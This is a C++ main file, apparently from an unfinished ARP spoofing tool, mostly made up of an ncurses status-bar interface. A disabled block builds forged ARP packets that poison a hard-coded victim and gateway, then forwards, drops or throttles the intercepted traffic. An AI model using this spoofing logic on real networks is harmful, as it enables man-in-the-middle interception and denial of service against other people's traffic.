#include "arp_spoofer_lib/headers/AdapterQuery.h"
#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/ARPSpoofing.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"
#include "ncurses_gui/headers/StatusBar.h"

#include <thread>
#include <string>
#include <list>
#include <atomic>
#include <random>
#include <ncurses.h>
#include <cstdio>
#include <getopt.h>

using std::thread;
using std::list;
using std::atomic_bool;
using std::fopen, std::fscanf;

const short STATUS_COLOR_PAIR = 1;

int main() {
    extern char *optarg;
    extern int optind;
    int opt;
    bool window_loop_to_stop = false;

    static char usage[] = "Usage: ARP_Spoofer [-I <interface name>] [-M <target MAC>] [-N <target ip>]";

    int a = 0;
    unsigned long rate = 0;

    concurrent_queue<string> thread_output(100);

    auto producer_f = [&](int idx) {
        int i = 0;
//        std::random_device rd;
//        std::mt19937 rng(rd());
//        std::uniform_int_distribution<unsigned long> uni(0, 100000);

        while (!a && !window_loop_to_stop) {
            thread_output.push_back(std::to_string(i++));
//            printf("[producer %d]: %d\n", idx, i++);
//            rate = uni(rng);
            std::this_thread::sleep_for(std::chrono::milliseconds(1));

        }
    };

//    auto consumer_f = [&](int idx) {
//        int i;
//        while (!a) {
//            i = thread_output.pop_front();
//            cout << "[consumer " << idx << " ]: " << i << endl;
//            std::this_thread::sleep_for(std::chrono::milliseconds(100));
//        }
//    };

    thread p1_t(producer_f, 1);
//    thread p2_t(producer_f, 2);
//    thread c1_t(consumer_f, 1);
//    thread c2_t(consumer_f, 2);

#define NOTEST
#ifdef NOTEST
    constexpr int MIN_WINDOWS_COLS = 90;
    constexpr int MIN_WINDOWS_LINES = 10;
    constexpr int ERR_WINDOW_TOO_SMALL = -1;

    list<string> output_buf;
    int gui_err = 0;

    initscr();
    use_default_colors();
//    newterm(nullptr, stderr, stdin);
//    scrollok(stdscr, true);
//    nocbreak();
    noecho();
    timeout(1);
    curs_set(0);
    set_escdelay(25);
    keypad(stdscr, true);

    if (!has_colors()) {
        endwin();
        printf("The terminal does not support color!\n");
        _exit(-1);
    }
    if (COLS < MIN_WINDOWS_COLS || LINES < MIN_WINDOWS_LINES) {
        window_loop_to_stop = true;
        gui_err = ERR_WINDOW_TOO_SMALL;
    }
    start_color();
    init_pair(STATUS_COLOR_PAIR, COLOR_BLACK, COLOR_GREEN);

    int winx, winy, curx, cury;
    const int BUF_SIZE = 100;
    string cmd_buf;
    int ch;
    StatusBar status_bar(std::cref(rate));

    int before_seq = -1;
    enum GuiState {
        InputRateMode,
        EchoMode
    };

    GuiState gui_state = GuiState::EchoMode;
    StatusBar::PktPolicy previous_status_bar_policy = StatusBar::PktPolicy::Forward;

    while (true) {
        if (window_loop_to_stop)
            break;

        ch = getch();
        erase();

        getmaxyx(stdscr, winy, winx);
        if (ch == KEY_RESIZE) {
            if (COLS < MIN_WINDOWS_COLS || LINES < MIN_WINDOWS_LINES) {
                window_loop_to_stop = true;
                gui_err = ERR_WINDOW_TOO_SMALL;
            }
        }

        switch (gui_state) {
            case GuiState::EchoMode: {
                switch (ch) {
                    case KEY_F(1):
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::Forward);
                        break;
                    case KEY_F(2):
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::Drop);
                        break;
                    case KEY_F(3):
                        gui_state = GuiState::InputRateMode;
                        previous_status_bar_policy = status_bar.get_pkt_policy();
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::EnteringRateValue);
                        break;
                    case 'q':
                        window_loop_to_stop = true;
                        break;
                    default:
                        /* Do nothing*/;
                }

                break;
            }
            case GuiState::InputRateMode: {
                switch (ch) {
                    case KEY_BACKSPACE: {
                        status_bar.pop_last_of_input_buf();
                        break;
                    }
                    case 10 /*ENTER*/:
                        gui_state = GuiState::EchoMode;

                        rate = status_bar.read_input_buf_as_num();
                        if (rate == ulong_limits::max())
                            goto ENTER_FAILED;

                        status_bar.clear_input_buf();
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::LimitRate);
                        break;
                    case 27 /*KEY_ESC*/:
                    ENTER_FAILED:
                        gui_state = GuiState::EchoMode;
                        status_bar.clear_input_buf();
                        status_bar.set_pkt_policy(previous_status_bar_policy);
                        break;
                    default:
                        if (isdigit(ch))
                            status_bar.append_char_to_input_buf(ch);
                }
                break;
            }
        }

        attron(COLOR_PAIR(STATUS_COLOR_PAIR));
        mvprintw(LINES - 1, 0, "%s", status_bar.get_status_bar_str(winx).c_str());
        attroff(COLOR_PAIR(STATUS_COLOR_PAIR));

        if (before_seq == thread_output.m_updated_seq)
            continue;

        before_seq = thread_output.m_updated_seq;
        queue<string> ret_q = thread_output.pop_all();
        while (!ret_q.empty()) {
            output_buf.push_front(ret_q.front());
            ret_q.pop();
            if (output_buf.size() > BUF_SIZE)
                output_buf.pop_back();
        }

        if (output_buf.empty())
            continue;

        auto iter = output_buf.begin();
        for (int now_y = std::min((unsigned long) (LINES - 2), output_buf.size() - 1); now_y >= 0; now_y--) {
            mvprintw(now_y, 0, "%s", (iter++)->c_str());
        }

    }
    endwin();

    switch (gui_err) {
        case ERR_WINDOW_TOO_SMALL:
            printf("Windows size must be at least %dx%d!\n", MIN_WINDOWS_COLS, MIN_WINDOWS_LINES);
        default:
            break;
    }

    p1_t.join();
//    p2_t.join();
//    c1_t.join();
//    c2_t.join();
#endif

#ifdef BPF_FILTER
    char filter_buf[PCAP_ERRBUF_SIZE];
    bpf_program bpf;
    sprintf(filter_buf, "ether host %02x:%02x:%02x:%02x:%02x:%02x",
            EXPAND_MAC(target_mac));

#ifdef DEBUG
    printf("filter buf: %s\n", filter_buf);
#endif

    // compile bpf filter
    if (pcap_compile(adapter, &bpf, filter_buf,
                     1, PCAP_NETMASK_UNKNOWN) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "compiling BPF filter");
        pcap_close(adapter);
        return -1;
    }

    // set bpf filter on adapter
    if (pcap_setfilter(adapter, &bpf) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "setting BPF filter");
        pcap_close(adapter);
        return -1;
    }
#endif

//#define PACKET_CAPTURE
#ifdef PACKET_CAPTURE
    u_char target_ip[4] = IP_ARRAY(192, 168, 43, 171);
    u_char target_mac[6] = MAC_ARRAY(9c, b6, d0, b9, 1a, 0f);

    u_char gateway_ip[4] = IP_ARRAY(192, 168, 43, 1);
    u_char gateway_mac[6] = MAC_ARRAY(22, 47, da, 58, 88, 8c);

    u_char self_ip[4] = IP_ARRAY(192, 168, 43, 215);
    u_char self_mac[6] = MAC_ARRAY(58, 91, CF, 98, 7B, FF);

    u_char broadcast_ip[4] = IP_ARRAY(0, 0, 0, 0);
    u_char broadcast_mac[6] = MAC_ARRAY(FF, FF, FF, FF, FF, FF);

    printf("sizeof(arp_packet): %lu\n", sizeof(arp_packet));

    // Let user select the network interface used to capture packets
    string dev_name = list_dev_and_choose_dev();

    // Acquire the IP and MAC of current gateway


    pcap_t *adapter = open_adapter(dev_name);

    arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
                                                                target_ip, target_mac);
    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);

    arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_ip, self_mac,
                                                                 gateway_ip, gateway_mac);
    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);

    // TODO: Add ARP recovering

    PacketHandler pkt_h(adapter, self_mac,
                        target_mac, gateway_mac,
                        target_ip, std::ref(thread_output));
    char input[256];
    string cmd;
    while (scanf("%s", input) != EOF) {
        cmd = input;
        if (cmd == "so") {
            target_spoofer.start();
            gateway_spoofer.start();
        } else if (cmd == "sf") {
            target_spoofer.stop();
            gateway_spoofer.stop();
        } else if (cmd == "ex") {
            target_spoofer.stop();
            gateway_spoofer.stop();
            pkt_h.stop();
            pkt_h.stop();
            pcap_close(adapter);
            return 0;
        } else if (cmd == "po")
            pkt_h.start();
        else if (cmd == "pf")
            pkt_h.stop();
        else if (cmd == "do")
            pkt_h.set_drop_packet(true);
        else if (cmd == "df")
            pkt_h.set_drop_packet(false);
        else if (cmd[0] == 'r') {
            int rate_kBps = std::stoi(cmd.substr(1, std::string::npos));
            pkt_h.set_rate_limit_kBps(rate_kBps);
        }
    }
#endif
    return 0;
}
